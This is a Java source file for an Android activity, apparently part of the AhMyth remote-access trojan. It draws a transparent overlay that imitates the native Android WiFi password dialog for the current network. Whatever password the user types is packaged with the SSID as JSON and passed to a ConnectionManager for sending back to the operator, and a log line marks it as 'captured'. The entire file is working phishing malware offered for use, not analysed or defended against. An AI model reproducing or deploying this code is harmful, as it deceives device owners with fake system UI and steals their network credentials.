package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.text.InputType;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import org.json.JSONObject;

/**
 * Transparent activity that shows a WiFi password prompt
 * Looks like the native Android WiFi authentication dialog
 */
public class WiFiPasswordActivity extends Activity {
    private static final String TAG = "WiFiPasswordActivity";
    private String currentSSID = "WiFi Network";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make activity transparent
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        
        // Get SSID from intent or current WiFi
        String intentSSID = getIntent().getStringExtra("ssid");
        if (intentSSID != null && !intentSSID.isEmpty()) {
            currentSSID = intentSSID;
        } else {
            // Get current WiFi SSID
            getCurrentSSID();
        }
        
        // Show the dialog
        showWifiPasswordDialog();
    }
    
    private void getCurrentSSID() {
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                if (wifiInfo != null) {
                    String ssid = wifiInfo.getSSID();
                    if (ssid != null && !ssid.equals("<unknown ssid>")) {
                        currentSSID = ssid.replace("\"", "");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting SSID", e);
        }
    }
    
    private void showWifiPasswordDialog() {
        // Create main layout
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setPadding(dp(24), dp(20), dp(24), dp(8));
        
        // WiFi icon and title
        TextView titleText = new TextView(this);
        titleText.setText(currentSSID);
        titleText.setTextSize(20);
        titleText.setTextColor(Color.BLACK);
        titleText.setPadding(0, 0, 0, dp(8));
        mainLayout.addView(titleText);
        
        // Subtitle
        TextView subtitleText = new TextView(this);
        subtitleText.setText("Enter the password for \"" + currentSSID + "\"");
        subtitleText.setTextSize(14);
        subtitleText.setTextColor(Color.GRAY);
        subtitleText.setPadding(0, 0, 0, dp(16));
        mainLayout.addView(subtitleText);
        
        // Password input
        final EditText passwordInput = new EditText(this);
        passwordInput.setHint("Password");
        passwordInput.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        passwordInput.setTextSize(16);
        passwordInput.setPadding(dp(12), dp(12), dp(12), dp(12));
        passwordInput.setBackgroundResource(android.R.drawable.edit_text);
        mainLayout.addView(passwordInput);
        
        // Show password checkbox
        LinearLayout checkboxLayout = new LinearLayout(this);
        checkboxLayout.setOrientation(LinearLayout.HORIZONTAL);
        checkboxLayout.setPadding(0, dp(8), 0, dp(16));
        checkboxLayout.setGravity(Gravity.CENTER_VERTICAL);
        
        final CheckBox showPasswordCheckbox = new CheckBox(this);
        showPasswordCheckbox.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                passwordInput.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD);
            } else {
                passwordInput.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
            }
            passwordInput.setSelection(passwordInput.getText().length());
        });
        checkboxLayout.addView(showPasswordCheckbox);
        
        TextView showPasswordText = new TextView(this);
        showPasswordText.setText("Show password");
        showPasswordText.setTextSize(14);
        showPasswordText.setTextColor(Color.DKGRAY);
        showPasswordText.setPadding(dp(8), 0, 0, 0);
        checkboxLayout.addView(showPasswordText);
        
        mainLayout.addView(checkboxLayout);
        
        // Buttons layout
        LinearLayout buttonsLayout = new LinearLayout(this);
        buttonsLayout.setOrientation(LinearLayout.HORIZONTAL);
        buttonsLayout.setGravity(Gravity.END);
        buttonsLayout.setPadding(0, dp(8), 0, 0);
        
        Button cancelButton = new Button(this);
        cancelButton.setText("Cancel");
        cancelButton.setTextColor(Color.parseColor("#1976D2"));
        cancelButton.setBackgroundColor(Color.TRANSPARENT);
        cancelButton.setOnClickListener(v -> {
            sendResult(null, true);
            finish();
        });
        buttonsLayout.addView(cancelButton);
        
        Button connectButton = new Button(this);
        connectButton.setText("Connect");
        connectButton.setTextColor(Color.parseColor("#1976D2"));
        connectButton.setBackgroundColor(Color.TRANSPARENT);
        connectButton.setOnClickListener(v -> {
            String password = passwordInput.getText().toString();
            if (!password.isEmpty()) {
                sendResult(password, false);
            }
            finish();
        });
        buttonsLayout.addView(connectButton);
        
        mainLayout.addView(buttonsLayout);
        
        // Create and show dialog
        AlertDialog.Builder builder = new AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert);
        builder.setView(mainLayout);
        builder.setCancelable(false);
        
        AlertDialog dialog = builder.create();
        dialog.setOnDismissListener(d -> finish());
        dialog.show();
        
        // Set dialog width
        Window window = dialog.getWindow();
        if (window != null) {
            WindowManager.LayoutParams params = window.getAttributes();
            params.width = dp(320);
            window.setAttributes(params);
        }
    }
    
    private void sendResult(String password, boolean cancelled) {
        try {
            JSONObject result = new JSONObject();
            result.put("ssid", currentSSID);
            result.put("cancelled", cancelled);
            if (password != null) {
                result.put("password", password);
                result.put("success", true);
            } else {
                result.put("success", false);
            }
            
            // Send via ConnectionManager
            ConnectionManager.sendWifiPasswordResult(result);
            
            Log.d(TAG, "WiFi password result sent: " + (password != null ? "captured" : "cancelled"));
        } catch (Exception e) {
            Log.e(TAG, "Error sending result", e);
        }
    }
    
    private int dp(int value) {
        float density = getResources().getDisplayMetrics().density;
        return (int) (value * density);
    }
    
    @Override
    public void onBackPressed() {
        sendResult(null, true);
        super.onBackPressed();
    }
}

